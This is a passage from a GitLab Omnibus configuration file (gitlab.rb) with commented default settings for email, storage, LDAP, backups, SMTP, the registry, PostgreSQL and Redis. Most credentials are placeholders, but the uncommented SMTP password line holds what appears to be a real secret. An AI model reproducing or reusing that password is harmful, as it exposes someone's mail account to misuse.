###! Docs: https://github.com/ondrejbartas/sidekiq-cron#adding-cron-job
###!       https://docs.gitlab.com/ce/ci/yaml/README.html#artifacts:expire_in
# gitlab_rails['stuck_ci_jobs_worker_cron'] = "0 0 * * *"
# gitlab_rails['expire_build_artifacts_worker_cron'] = "50 * * * *"
# gitlab_rails['pipeline_schedule_worker_cron'] = "41 * * * *"
# gitlab_rails['ci_archive_traces_cron_worker_cron'] = "17 * * * *"
# gitlab_rails['repository_check_worker_cron'] = "20 * * * *"
# gitlab_rails['admin_email_worker_cron'] = "0 0 * * 0"
# gitlab_rails['repository_archive_cache_worker_cron'] = "0 * * * *"
# gitlab_rails['pages_domain_verification_cron_worker'] = "*/15 * * * *"

### Webhook Settings
###! Number of seconds to wait for HTTP response after sending webhook HTTP POST
###! request (default: 10)
# gitlab_rails['webhook_timeout'] = 10

### Trusted proxies
###! Customize if you have GitLab behind a reverse proxy which is running on a
###! different machine.
###! **Add the IP address for your reverse proxy to the list, otherwise users
###!   will appear signed in from that address.**
# gitlab_rails['trusted_proxies'] = []

### Monitoring settings
###! IP whitelist controlling access to monitoring endpoints
# gitlab_rails['monitoring_whitelist'] = ['127.0.0.0/8', '::1/128']
###! Time between sampling of unicorn socket metrics, in seconds
# gitlab_rails['monitoring_unicorn_sampler_interval'] = 10

### Reply by email
###! Allow users to comment on issues and merge requests by replying to
###! notification emails.
###! Docs: https://docs.gitlab.com/ce/administration/reply_by_email.html
# gitlab_rails['incoming_email_enabled'] = true

#### Incoming Email Address
####! The email address including the `%{key}` placeholder that will be replaced
####! to reference the item being replied to.
####! **The placeholder can be omitted but if present, it must appear in the
####!   "user" part of the address (before the `@`).**
# gitlab_rails['incoming_email_address'] = "gitlab-incoming+%{key}@gmail.com"

#### Email account username
####! **With third party providers, this is usually the full email address.**
####! **With self-hosted email servers, this is usually the user part of the
####!   email address.**
# gitlab_rails['incoming_email_email'] = "gitlab-incoming@gmail.com"

#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"

#### IMAP Settings
# gitlab_rails['incoming_email_host'] = "imap.gmail.com"
# gitlab_rails['incoming_email_port'] = 993
# gitlab_rails['incoming_email_ssl'] = true
# gitlab_rails['incoming_email_start_tls'] = false

#### Incoming Mailbox Settings
####! The mailbox where incoming mail will end up. Usually "inbox".
# gitlab_rails['incoming_email_mailbox_name'] = "inbox"
####! The IDLE command timeout.
# gitlab_rails['incoming_email_idle_timeout'] = 60

### Job Artifacts
# gitlab_rails['artifacts_enabled'] = true
# gitlab_rails['artifacts_path'] = "/var/opt/gitlab/gitlab-rails/shared/artifacts"
####! Job artifacts Object Store
####! Docs: https://docs.gitlab.com/ee/administration/job_artifacts.html#using-object-storage
# gitlab_rails['artifacts_object_store_enabled'] = false
# gitlab_rails['artifacts_object_store_direct_upload'] = false
# gitlab_rails['artifacts_object_store_background_upload'] = true
# gitlab_rails['artifacts_object_store_proxy_download'] = false
# gitlab_rails['artifacts_object_store_remote_directory'] = "artifacts"
# gitlab_rails['artifacts_object_store_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AWS_ACCESS_KEY_ID',
#   'aws_secret_access_key' => 'AWS_SECRET_ACCESS_KEY',
#   # # The below options configure an S3 compatible host instead of AWS
#   # 'aws_signature_version' => 4, # For creation of signed URLs. Set to 2 if provider does not support v4.
#   # 'endpoint' => 'https://s3.amazonaws.com', # default: nil - Useful for S3 compliant services such as DigitalOcean Spaces
#   # 'host' => 's3.amazonaws.com',
#   # 'path_style' => false # Use 'host/bucket_name/object' instead of 'bucket_name.host/object'
# }

### Git LFS
# gitlab_rails['lfs_enabled'] = true
# gitlab_rails['lfs_storage_path'] = "/var/opt/gitlab/gitlab-rails/shared/lfs-objects"
# gitlab_rails['lfs_object_store_enabled'] = false
# gitlab_rails['lfs_object_store_direct_upload'] = false
# gitlab_rails['lfs_object_store_background_upload'] = true
# gitlab_rails['lfs_object_store_proxy_download'] = false
# gitlab_rails['lfs_object_store_remote_directory'] = "lfs-objects"
# gitlab_rails['lfs_object_store_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AWS_ACCESS_KEY_ID',
#   'aws_secret_access_key' => 'AWS_SECRET_ACCESS_KEY',
#   # # The below options configure an S3 compatible host instead of AWS
#   # 'aws_signature_version' => 4, # For creation of signed URLs. Set to 2 if provider does not support v4.
#   # 'endpoint' => 'https://s3.amazonaws.com', # default: nil - Useful for S3 compliant services such as DigitalOcean Spaces
#   # 'host' => 's3.amazonaws.com',
#   # 'path_style' => false # Use 'host/bucket_name/object' instead of 'bucket_name.host/object'
# }

### GitLab uploads
###! Docs: https://docs.gitlab.com/ee/administration/uploads.html
# gitlab_rails['uploads_storage_path'] = "/var/opt/gitlab/gitlab-rails/public"
# gitlab_rails['uploads_base_dir'] = "uploads/-/system"
# gitlab_rails['uploads_object_store_enabled'] = false
# gitlab_rails['uploads_object_store_direct_upload'] = false
# gitlab_rails['uploads_object_store_background_upload'] = true
# gitlab_rails['uploads_object_store_proxy_download'] = false
# gitlab_rails['uploads_object_store_remote_directory'] = "uploads"
# gitlab_rails['uploads_object_store_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AWS_ACCESS_KEY_ID',
#   'aws_secret_access_key' => 'AWS_SECRET_ACCESS_KEY',
#   # # The below options configure an S3 compatible host instead of AWS
#   # 'host' => 's3.amazonaws.com',
#   # 'aws_signature_version' => 4, # For creation of signed URLs. Set to 2 if provider does not support v4.
#   # 'endpoint' => 'https://s3.amazonaws.com', # default: nil - Useful for S3 compliant services such as DigitalOcean Spaces
#   # 'path_style' => false # Use 'host/bucket_name/object' instead of 'bucket_name.host/object'
# }

### Usage Statistics
# gitlab_rails['usage_ping_enabled'] = true

### GitLab Mattermost
###! These settings are void if Mattermost is installed on the same omnibus
###! install
# gitlab_rails['mattermost_host'] = "https://mattermost.example.com"

### LDAP Settings
###! Docs: https://docs.gitlab.com/omnibus/settings/ldap.html
###! **Be careful not to break the indentation in the ldap_servers block. It is
###!   in yaml format and the spaces must be retained. Using tabs will not work.**

# gitlab_rails['ldap_enabled'] = false

###! **remember to close this block with 'EOS' below**
# gitlab_rails['ldap_servers'] = YAML.load <<-'EOS'
#   main: # 'main' is the GitLab 'provider ID' of this LDAP server
#     label: 'LDAP'
#     host: '_your_ldap_server'
#     port: 389
#     uid: 'sAMAccountName'
#     bind_dn: '_the_full_dn_of_the_user_you_will_bind_with'
#     password: '_the_password_of_the_bind_user'
#     encryption: 'plain' # "start_tls" or "simple_tls" or "plain"
#     verify_certificates: true
#     active_directory: true
#     allow_username_or_email_login: false
#     lowercase_usernames: false
#     block_auto_created_users: false
#     base: ''
#     user_filter: ''
#     ## EE only
#     group_base: ''
#     admin_group: ''
#     sync_ssh_keys: false
#
#   secondary: # 'secondary' is the GitLab 'provider ID' of second LDAP server
#     label: 'LDAP'
#     host: '_your_ldap_server'
#     port: 389
#     uid: 'sAMAccountName'
#     bind_dn: '_the_full_dn_of_the_user_you_will_bind_with'
#     password: '_the_password_of_the_bind_user'
#     encryption: 'plain' # "start_tls" or "simple_tls" or "plain"
#     verify_certificates: true
#     active_directory: true
#     allow_username_or_email_login: false
#     lowercase_usernames: false
#     block_auto_created_users: false
#     base: ''
#     user_filter: ''
#     ## EE only
#     group_base: ''
#     admin_group: ''
#     sync_ssh_keys: false
# EOS

### OmniAuth Settings
###! Docs: https://docs.gitlab.com/ce/integration/omniauth.html
# gitlab_rails['omniauth_enabled'] = nil
# gitlab_rails['omniauth_allow_single_sign_on'] = ['saml']
# gitlab_rails['omniauth_sync_email_from_provider'] = 'saml'
# gitlab_rails['omniauth_sync_profile_from_provider'] = ['saml']
# gitlab_rails['omniauth_sync_profile_attributes'] = ['email']
# gitlab_rails['omniauth_auto_sign_in_with_provider'] = 'saml'
# gitlab_rails['omniauth_block_auto_created_users'] = true
# gitlab_rails['omniauth_auto_link_ldap_user'] = false
# gitlab_rails['omniauth_auto_link_saml_user'] = false
# gitlab_rails['omniauth_external_providers'] = ['twitter', 'google_oauth2']
# gitlab_rails['omniauth_providers'] = [
#   {
#     "name" => "google_oauth2",
#     "app_id" => "YOUR APP ID",
#     "app_secret" => "YOUR APP SECRET",
#     "args" => { "access_type" => "offline", "approval_prompt" => "" }
#   }
# ]

### Backup Settings
###! Docs: https://docs.gitlab.com/omnibus/settings/backups.html

# gitlab_rails['manage_backup_path'] = true
# gitlab_rails['backup_path'] = "/var/opt/gitlab/backups"

###! Docs: https://docs.gitlab.com/ce/raketasks/backup_restore.html#backup-archive-permissions
# gitlab_rails['backup_archive_permissions'] = 0644

# gitlab_rails['backup_pg_schema'] = 'public'

###! The duration in seconds to keep backups before they are allowed to be deleted
# gitlab_rails['backup_keep_time'] = 604800

# gitlab_rails['backup_upload_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AKIAKIAKI',
#   'aws_secret_access_key' => 'secret123'
# }
# gitlab_rails['backup_upload_remote_directory'] = 'my.s3.bucket'
# gitlab_rails['backup_multipart_chunk_size'] = 104857600

###! **Turns on AWS Server-Side Encryption with Amazon S3-Managed Keys for
###!   backups**
# gitlab_rails['backup_encryption'] = 'AES256'

###! **Specifies Amazon S3 storage class to use for backups. Valid values
###!   include 'STANDARD', 'STANDARD_IA', and 'REDUCED_REDUNDANCY'**
# gitlab_rails['backup_storage_class'] = 'STANDARD'


### Pseudonymizer Settings
# gitlab_rails['pseudonymizer_manifest'] = 'config/pseudonymizer.yml'
# gitlab_rails['pseudonymizer_upload_remote_directory'] = 'gitlab-elt'
# gitlab_rails['pseudonymizer_upload_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AKIAKIAKI',
#   'aws_secret_access_key' => 'secret123'
# }


### For setting up different data storing directory
###! Docs: https://docs.gitlab.com/omnibus/settings/configuration.html#storing-git-data-in-an-alternative-directory
###! **If you want to use a single non-default directory to store git data use a
###!   path that doesn't contain symlinks.**
# git_data_dirs({
#   "default" => {
#     "path" => "/mnt/nfs-01/git-data"
#    }
# })

### Gitaly settings
# gitlab_rails['gitaly_token'] = 'secret token'

### For storing GitLab application uploads, eg. LFS objects, build artifacts
###! Docs: https://docs.gitlab.com/ce/development/shared_files.html
# gitlab_rails['shared_path'] = '/var/opt/gitlab/gitlab-rails/shared'

### Wait for file system to be mounted
###! Docs: https://docs.gitlab.com/omnibus/settings/configuration.html#only-start-omnibus-gitlab-services-after-a-given-filesystem-is-mounted
# high_availability['mountpoint'] = ["/var/opt/gitlab/git-data", "/var/opt/gitlab/gitlab-rails/shared"]

### GitLab Shell settings for GitLab
# gitlab_rails['gitlab_shell_ssh_port'] = 22
# gitlab_rails['gitlab_shell_git_timeout'] = 800

### Extra customization
# gitlab_rails['extra_google_analytics_id'] = '_your_tracking_id'
# gitlab_rails['extra_piwik_url'] = '_your_piwik_url'
# gitlab_rails['extra_piwik_site_id'] = '_your_piwik_site_id'

##! Docs: https://docs.gitlab.com/omnibus/settings/environment-variables.html
# gitlab_rails['env'] = {
#   'BUNDLE_GEMFILE' => "/opt/gitlab/embedded/service/gitlab-rails/Gemfile",
#   'PATH' => "/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin"
# }

# gitlab_rails['rack_attack_git_basic_auth'] = {
#   'enabled' => true,
#   'ip_whitelist' => ["127.0.0.1"],
#   'maxretry' => 10,
#   'findtime' => 60,
#   'bantime' => 3600
# }

# gitlab_rails['rack_attack_protected_paths'] = [
#   '/users/password',
#   '/users/sign_in',
#   '/api/#{API::API.version}/session.json',
#   '/api/#{API::API.version}/session',
#   '/users',
#   '/users/confirmation',
#   '/unsubscribes/',
#   '/import/github/personal_access_token'
# ]

###! **We do not recommend changing these directories.**
# gitlab_rails['dir'] = "/var/opt/gitlab/gitlab-rails"
# gitlab_rails['log_directory'] = "/var/log/gitlab/gitlab-rails"

### GitLab application settings
# gitlab_rails['uploads_directory'] = "/var/opt/gitlab/gitlab-rails/uploads"
# gitlab_rails['rate_limit_requests_per_period'] = 10
# gitlab_rails['rate_limit_period'] = 60

#### Change the initial default admin password and shared runner registration tokens.
####! **Only applicable on initial setup, changing these settings after database
####!   is created and seeded won't yield any change.**
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['initial_shared_runners_registration_token'] = "token"

#### Enable or disable automatic database migrations
# gitlab_rails['auto_migrate'] = true

#### This is advanced feature used by large gitlab deployments where loading
#### whole RAILS env takes a lot of time.
# gitlab_rails['rake_cache_clear'] = true

### GitLab database settings
###! Docs: https://docs.gitlab.com/omnibus/settings/database.html
###! **Only needed if you use an external database.**
# gitlab_rails['db_adapter'] = "postgresql"
# gitlab_rails['db_encoding'] = "unicode"
# gitlab_rails['db_collation'] = nil
# gitlab_rails['db_database'] = "gitlabhq_production"
# gitlab_rails['db_pool'] = 10
# gitlab_rails['db_username'] = "gitlab"
# gitlab_rails['db_password'] = nil
# gitlab_rails['db_host'] = nil
# gitlab_rails['db_port'] = 5432
# gitlab_rails['db_socket'] = nil
# gitlab_rails['db_sslmode'] = nil
# gitlab_rails['db_sslcompression'] = 0
# gitlab_rails['db_sslrootcert'] = nil
# gitlab_rails['db_prepared_statements'] = false
# gitlab_rails['db_statements_limit'] = 1000


### GitLab Redis settings
###! Connect to your own Redis instance
###! Docs: https://docs.gitlab.com/omnibus/settings/redis.html

#### Redis TCP connection
# gitlab_rails['redis_host'] = "127.0.0.1"
# gitlab_rails['redis_port'] = 6379
# gitlab_rails['redis_password'] = nil
# gitlab_rails['redis_database'] = 0

#### Redis local UNIX socket (will be disabled if TCP method is used)
# gitlab_rails['redis_socket'] = "/var/opt/gitlab/redis/redis.socket"

#### Sentinel support
####! To have Sentinel working, you must enable Redis TCP connection support
####! above and define a few Sentinel hosts below (to get a reliable setup
####! at least 3 hosts).
####! **You don't need to list every sentinel host, but the ones not listed will
####!   not be used in a fail-over situation to query for the new master.**
# gitlab_rails['redis_sentinels'] = [
#   {'host' => '127.0.0.1', 'port' => 26379},
# ]

#### Separate instances support
###! Docs: https://docs.gitlab.com/omnibus/settings/redis.html#running-with-multiple-redis-instances
# gitlab_rails['redis_cache_instance'] = nil
# gitlab_rails['redis_cache_sentinels'] = nil
# gitlab_rails['redis_queues_instance'] = nil
# gitlab_rails['redis_queues_sentinels'] = nil
# gitlab_rails['redis_shared_state_instance'] = nil
# gitlab_rails['redis_shared_sentinels'] = nil

### GitLab email server settings
###! Docs: https://docs.gitlab.com/omnibus/settings/smtp.html
###! **Use smtp instead of sendmail/postfix.**

# gitlab_rails['smtp_enable'] = true
# gitlab_rails['smtp_address'] = "smtp.server"
# gitlab_rails['smtp_port'] = 465
# gitlab_rails['smtp_user_name'] = "smtp user"
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_rails['smtp_domain'] = "example.com"
# gitlab_rails['smtp_authentication'] = "login"
# gitlab_rails['smtp_enable_starttls_auto'] = true
# gitlab_rails['smtp_tls'] = false

###! **Can be: 'none', 'peer', 'client_once', 'fail_if_no_peer_cert'**
###! Docs: http://api.rubyonrails.org/classes/ActionMailer/Base.html
# gitlab_rails['smtp_openssl_verify_mode'] = 'none'

# gitlab_rails['smtp_ca_path'] = "/etc/ssl/certs"
# gitlab_rails['smtp_ca_file'] = "/etc/ssl/certs/ca-certificates.crt"

################################################################################
## Container Registry settings
##! Docs: https://docs.gitlab.com/ce/administration/container_registry.html
################################################################################

# registry_external_url 'https://registry.gitlab.example.com'

### Settings used by GitLab application
# gitlab_rails['registry_enabled'] = true
# gitlab_rails['registry_host'] = "registry.gitlab.example.com"
# gitlab_rails['registry_port'] = "5005"
# gitlab_rails['registry_path'] = "/var/opt/gitlab/gitlab-rails/shared/registry"

###! **Do not change the following 3 settings unless you know what you are
###!   doing**
# gitlab_rails['registry_api_url'] = "http://localhost:5000"
# gitlab_rails['registry_key_path'] = "/var/opt/gitlab/gitlab-rails/certificate.key"
# gitlab_rails['registry_issuer'] = "omnibus-gitlab-issuer"

### Settings used by Registry application
# registry['enable'] = true
# registry['username'] = "registry"
# registry['group'] = "registry"
# registry['uid'] = nil
# registry['gid'] = nil
# registry['dir'] = "/var/opt/gitlab/registry"
# registry['registry_http_addr'] = "localhost:5000"
# registry['debug_addr'] = "localhost:5001"
# registry['log_directory'] = "/var/log/gitlab/registry"
# registry['env_directory'] = "/opt/gitlab/etc/registry/env"
# registry['env'] = {}
# registry['log_level'] = "info"
# registry['rootcertbundle'] = "/var/opt/gitlab/registry/certificate.crt"
# registry['health_storagedriver_enabled'] = true
# registry['storage_delete_enabled'] = true

### Registry backend storage
###! Docs: https://docs.gitlab.com/ce/administration/container_registry.html#container-registry-storage-driver
# registry['storage'] = {
#   's3' => {
#     'accesskey' => 'AKIAKIAKI',
#     'secretkey' => 'secret123',
#     'bucket' => 'gitlab-registry-bucket-AKIAKIAKI'
#   }
# }

### Registry notifications endpoints
# registry['notifications'] = [
#   {
#     'name' => 'test_endpoint',
#     'url' => 'https://gitlab.example.com/notify2',
#     'timeout' => '500ms',
#     'threshold' => 5,
#     'backoff' => '1s',
#     'headers' => {
#       "Authorization" => ["AUTHORIZATION_EXAMPLE_TOKEN"]
#     }
#   }
# ]
### Default registry notifications
# registry['default_notifications_timeout'] = "500ms"
# registry['default_notifications_threshold'] = 5
# registry['default_notifications_backoff'] = "1s"
# registry['default_notifications_headers'] = {}



################################################################################
## GitLab Workhorse
##! Docs: https://gitlab.com/gitlab-org/gitlab-workhorse/blob/master/README.md
################################################################################

# gitlab_workhorse['enable'] = true
# gitlab_workhorse['ha'] = false
# gitlab_workhorse['listen_network'] = "unix"
# gitlab_workhorse['listen_umask'] = 000
# gitlab_workhorse['listen_addr'] = "/var/opt/gitlab/gitlab-workhorse/socket"
# gitlab_workhorse['auth_backend'] = "http://localhost:8080"

##! the empty string is the default in gitlab-workhorse option parser
# gitlab_workhorse['auth_socket'] = "''"

##! put an empty string on the command line
# gitlab_workhorse['pprof_listen_addr'] = "''"

# gitlab_workhorse['prometheus_listen_addr'] = "localhost:9229"

# gitlab_workhorse['dir'] = "/var/opt/gitlab/gitlab-workhorse"
# gitlab_workhorse['log_directory'] = "/var/log/gitlab/gitlab-workhorse"
# gitlab_workhorse['proxy_headers_timeout'] = "1m0s"

##! limit number of concurrent API requests, defaults to 0 which is unlimited
# gitlab_workhorse['api_limit'] = 0

##! limit number of API requests allowed to be queued, defaults to 0 which
##! disables queuing
# gitlab_workhorse['api_queue_limit'] = 0

##! duration after which we timeout requests if they sit too long in the queue
# gitlab_workhorse['api_queue_duration'] = "30s"

##! Long polling duration for job requesting for runners
# gitlab_workhorse['api_ci_long_polling_duration'] = "60s"

##! Log format: default is text, can also be json or none.
# gitlab_workhorse['log_format'] = "json"

# gitlab_workhorse['env'] = {
#   'PATH' => "/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin"
# }

################################################################################
## GitLab User Settings
##! Modify default git user.
##! Docs: https://docs.gitlab.com/omnibus/settings/configuration.html#changing-the-name-of-the-git-user-group
################################################################################

# user['username'] = "git"
# user['group'] = "git"
# user['uid'] = nil
# user['gid'] = nil

##! The shell for the git user
# user['shell'] = "/bin/sh"

##! The home directory for the git user
# user['home'] = "/var/opt/gitlab"

# user['git_user_name'] = "GitLab"
# user['git_user_email'] = "gitlab@#{node['fqdn']}"

################################################################################
## GitLab Unicorn
##! Tweak unicorn settings.
##! Docs: https://docs.gitlab.com/omnibus/settings/unicorn.html
################################################################################

# unicorn['worker_timeout'] = 60
###! Minimum worker_processes is 2 at this moment
###! See https://gitlab.com/gitlab-org/gitlab-ce/issues/18771
# unicorn['worker_processes'] = 2

### Advanced settings
# unicorn['listen'] = 'localhost'
# unicorn['port'] = 8080
# unicorn['socket'] = '/var/opt/gitlab/gitlab-rails/sockets/gitlab.socket'
# unicorn['pidfile'] = '/opt/gitlab/var/unicorn/unicorn.pid'
# unicorn['tcp_nopush'] = true
# unicorn['backlog_socket'] = 1024

###! **Make sure somaxconn is equal or higher then backlog_socket**
# unicorn['somaxconn'] = 1024

###! **We do not recommend changing this setting**
# unicorn['log_directory'] = "/var/log/gitlab/unicorn"

### **Only change these settings if you understand well what they mean**
###! Docs: https://about.gitlab.com/2015/06/05/how-gitlab-uses-unicorn-and-unicorn-worker-killer/
###!       https://github.com/kzk/unicorn-worker-killer
# unicorn['worker_memory_limit_min'] = "400 * 1 << 20"
# unicorn['worker_memory_limit_max'] = "650 * 1 << 20"

################################################################################
## GitLab Sidekiq
################################################################################

# sidekiq['log_directory'] = "/var/log/gitlab/sidekiq"
# sidekiq['log_format'] = "default"
# sidekiq['shutdown_timeout'] = 4
# sidekiq['concurrency'] = 25
# sidekiq['metrics_enabled'] = true
# sidekiq['listen_address'] = "localhost"
# sidekiq['listen_port'] = 8082

################################################################################
## gitlab-shell
################################################################################

# gitlab_shell['audit_usernames'] = false
# gitlab_shell['log_level'] = 'INFO'
# gitlab_shell['log_format'] = 'json'
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
# gitlab_shell['log_directory'] = "/var/log/gitlab/gitlab-shell/"
# gitlab_shell['custom_hooks_dir'] = "/opt/gitlab/embedded/service/gitlab-shell/hooks"

# gitlab_shell['auth_file'] = "/var/opt/gitlab/.ssh/authorized_keys"

### Git trace log file.
###! If set, git commands receive GIT_TRACE* environment variables
###! Docs: https://git-scm.com/book/es/v2/Git-Internals-Environment-Variables#Debugging
###! An absolute path starting with / – the trace output will be appended to
###! that file. It needs to exist so we can check permissions and avoid
###! throwing warnings to the users.
# gitlab_shell['git_trace_log_file'] = "/var/log/gitlab/gitlab-shell/gitlab-shell-git-trace.log"

##! **We do not recommend changing this directory.**
# gitlab_shell['dir'] = "/var/opt/gitlab/gitlab-shell"

################################################################
## GitLab PostgreSQL
################################################################

###! Changing any of these settings requires a restart of postgresql.
###! By default, reconfigure reloads postgresql if it is running. If you
###! change any of these settings, be sure to run `gitlab-ctl restart postgresql`
###! after reconfigure in order for the changes to take effect.
# postgresql['enable'] = true
# postgresql['listen_address'] = nil
# postgresql['port'] = 5432
# postgresql['data_dir'] = "/var/opt/gitlab/postgresql/data"

##! **recommend value is 1/4 of total RAM, up to 14GB.**
# postgresql['shared_buffers'] = "256MB"

### Advanced settings
# postgresql['ha'] = false
# postgresql['dir'] = "/var/opt/gitlab/postgresql"
# postgresql['log_directory'] = "/var/log/gitlab/postgresql"
# postgresql['username'] = "gitlab-psql"
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['uid'] = nil
# postgresql['gid'] = nil
# postgresql['shell'] = "/bin/sh"
# postgresql['home'] = "/var/opt/gitlab/postgresql"
# postgresql['user_path'] = "/opt/gitlab/embedded/bin:/opt/gitlab/bin:$PATH"
# postgresql['sql_user'] = "gitlab"
# postgresql['max_connections'] = 200
# postgresql['md5_auth_cidr_addresses'] = []
# postgresql['trust_auth_cidr_addresses'] = []
# postgresql['wal_buffers'] = "-1"
# postgresql['autovacuum_max_workers'] = "3"
# postgresql['autovacuum_freeze_max_age'] = "200000000"
# postgresql['log_statement'] = nil
# postgresql['track_activity_query_size'] = "1024"
# postgresql['shared_preload_libraries'] = nil
# postgresql['dynamic_shared_memory_type'] = nil
# postgresql['hot_standby'] = "off"

### SSL settings
# See https://www.postgresql.org/docs/9.6/static/runtime-config-connection.html#GUC-SSL-CERT-FILE for more details
# postgresql['ssl'] = 'on'
# postgresql['ssl_ciphers'] = 'HIGH:MEDIUM:+3DES:!aNULL:!SSLv3:!TLSv1'
# postgresql['ssl_cert_file'] = 'server.crt'
# postgresql['ssl_key_file'] = 'server.key'
# postgresql['ssl_ca_file'] = '/opt/gitlab/embedded/ssl/certs/cacert.pem'
# postgresql['ssl_crl_file'] = nil

### Replication settings
###! Note, some replication settings do not require a full restart. They are documented below.
# postgresql['wal_level'] = "hot_standby"
# postgresql['max_wal_senders'] = 5
# postgresql['max_replication_slots'] = 0
# postgresql['max_locks_per_transaction'] = 128

# Backup/Archive settings
# postgresql['archive_mode'] = "off"

###! Changing any of these settings only requires a reload of postgresql. You do not need to
###! restart postgresql if you change any of these and run reconfigure.
# postgresql['work_mem'] = "16MB"
# postgresql['maintenance_work_mem'] = "16MB"
# postgresql['checkpoint_segments'] = 10
# postgresql['checkpoint_timeout'] = "5min"
# postgresql['checkpoint_completion_target'] = 0.9
# postgresql['effective_io_concurrency'] = 1
# postgresql['checkpoint_warning'] = "30s"
# postgresql['effective_cache_size'] = "1MB"
# postgresql['shmmax'] =  17179869184 # or 4294967295
# postgresql['shmall'] =  4194304 # or 1048575
# postgresql['autovacuum'] = "on"
# postgresql['log_autovacuum_min_duration'] = "-1"
# postgresql['autovacuum_naptime'] = "1min"
# postgresql['autovacuum_vacuum_threshold'] = "50"
# postgresql['autovacuum_analyze_threshold'] = "50"
# postgresql['autovacuum_vacuum_scale_factor'] = "0.02"
# postgresql['autovacuum_analyze_scale_factor'] = "0.01"
# postgresql['autovacuum_vacuum_cost_delay'] = "20ms"
# postgresql['autovacuum_vacuum_cost_limit'] = "-1"
# postgresql['statement_timeout'] = "60000"
# postgresql['idle_in_transaction_session_timeout'] = "60000"
# postgresql['log_line_prefix'] = "%a"
# postgresql['max_worker_processes'] = 8
# postgresql['max_parallel_workers_per_gather'] = 0
# postgresql['log_lock_waits'] = 1
# postgresql['deadlock_timeout'] = '5s'
# postgresql['track_io_timing'] = 0
# postgresql['default_statistics_target'] = 1000

### Available in PostgreSQL 9.6 and later
# postgresql['min_wal_size'] = 80MB
# postgresql['max_wal_size'] = 1GB

# Backup/Archive settings
# postgresql['archive_command'] = nil
# postgresql['archive_timeout'] = "0"

### Replication settings
# postgresql['sql_replication_user'] = "gitlab_replicator"
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# postgresql['wal_keep_segments'] = 10
# postgresql['max_standby_archive_delay'] = "30s"
# postgresql['max_standby_streaming_delay'] = "30s"
# postgresql['synchronous_commit'] = on
# postgresql['synchronous_standby_names'] = ''
# postgresql['hot_standby_feedback'] = 'off'
# postgresql['random_page_cost'] = 2.0
# postgresql['log_temp_files'] = -1
# postgresql['log_checkpoints'] = 'off'
# To add custom entries to pg_hba.conf use the following
# postgresql['custom_pg_hba_entries'] = {
#   APPLICATION: [ # APPLICATION should identify what the settings are used for
#     {
#       type: example,
#       database: example,
#       user: example,
#       cidr: example,
#       method: example,
#       option: example
#     }
#   ]
# }
# See https://www.postgresql.org/docs/9.6/static/auth-pg-hba-conf.html for an explanation
# of the values


################################################################################
## GitLab Redis
##! **Can be disabled if you are using your own Redis instance.**
##! Docs: https://docs.gitlab.com/omnibus/settings/redis.html
################################################################################

# redis['enable'] = true
# redis['ha'] = false
# redis['hz'] = 10
# redis['dir'] = "/var/opt/gitlab/redis"
# redis['log_directory'] = "/var/log/gitlab/redis"
# redis['username'] = "gitlab-redis"
# redis['maxclients'] = "10000"
# redis['maxmemory'] = "0"
# redis['maxmemory_policy'] = "noeviction"
# redis['maxmemory_samples'] = "5"
# redis['tcp_backlog'] = 511
# redis['tcp_timeout'] = "60"
# redis['tcp_keepalive'] = "300"
# redis['uid'] = nil
# redis['gid'] = nil

###! **To enable only Redis service in this machine, uncomment
###!   one of the lines below (choose master or slave instance types).**
###! Docs: https://docs.gitlab.com/omnibus/settings/redis.html
###!       https://docs.gitlab.com/ce/administration/high_availability/redis.html
# redis_master_role['enable'] = true
# redis_slave_role['enable'] = true

### Redis TCP support (will disable UNIX socket transport)
# redis['bind'] = '0.0.0.0' # or specify an IP to bind to a single one
# redis['port'] = 6379
# redis['password'] = 'redis-password-goes-here'

### Redis Sentinel support
###! **You need a master slave Redis replication to be able to do failover**
###! **Please read the documentation before enabling it to understand the
###!   caveats:**
###! Docs: https://docs.gitlab.com/ce/administration/high_availability/redis.html

### Replication support
#### Slave Redis instance
# redis['master'] = false # by default this is true

#### Slave and Sentinel shared configuration
####! **Both need to point to the master Redis instance to get replication and
####!   heartbeat monitoring**
# redis['master_name'] = 'gitlab-redis'
# redis['master_ip'] = nil
# redis['master_port'] = 6379

#### Support to run redis slaves in a Docker or NAT environment
####! Docs: https://redis.io/topics/replication#configuring-replication-in-docker-and-nat
# redis['announce_ip'] = nil
# redis['announce_port'] = nil

####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
####!   master/slave in a failover event.**
# redis['master_password'] = 'redis-password-goes-here'

####! Increase these values when your slaves can't catch up with master
# redis['client_output_buffer_limit_normal'] = '0 0 0'
# redis['client_output_buffer_limit_slave'] = '256mb 64mb 60'
# redis['client_output_buffer_limit_pubsub'] = '32mb 8mb 60'

#####! Redis snapshotting frequency
#####! Set to [] to disable
#####! Set to [''] to clear previously set values
# redis['save'] = [ '900 1', '300 10', '60 10000' ]

################################################################################
## GitLab Web server
##! Docs: https://docs.gitlab.com/omnibus/settings/nginx.html#using-a-non-bundled-web-server
################################################################################

##! When bundled nginx is disabled we need to add the external webserver user to
##! the GitLab webserver group.
# web_server['external_users'] = []
# web_server['username'] = 'gitlab-www'
# web_server['group'] = 'gitlab-www'
# web_server['uid'] = nil
# web_server['gid'] = nil
# web_server['shell'] = '/bin/false'
# web_server['home'] = '/var/opt/gitlab/nginx'

################################################################################
## GitLab NGINX
##! Docs: https://docs.gitlab.com/omnibus/settings/nginx.html
################################################################################

